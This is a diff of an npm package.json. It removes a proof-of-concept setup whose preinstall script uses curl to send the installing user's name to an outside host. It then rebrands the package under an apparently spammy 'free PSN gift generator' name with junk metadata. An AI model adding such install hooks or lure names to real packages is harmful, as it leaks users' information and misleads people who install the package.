@@ -1,13 +1,16 @@
 {
-  "name": "opx-base-component",
-  "version": "1.99.1",
-  "description": "PoC for local Nexus installation vulnerability",
+  "name": "new_tricks_new-updated-psn_gift_generator_free_2023_no_human_today_mghjfgb",
+  "version": "9.2.7",
+  "homepage": "fuccs a no entry",
+  "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "echo \"Error: no test specified\" && exit 1",
-	"preinstall": "curl -H \"X-WhoAmI: $USER\" https://dev.oscato.com/opx-base-component-postinstall",
-	"postinstall": "echo \"Greetings from pwnville, PoCfully yours\""
+    "test": "test"
   },
-  "author": "",
+  "repository": {
+    "type": "git",
+    "url": "git"
+  },
+  "author": "xava",
   "license": "ISC"
 }
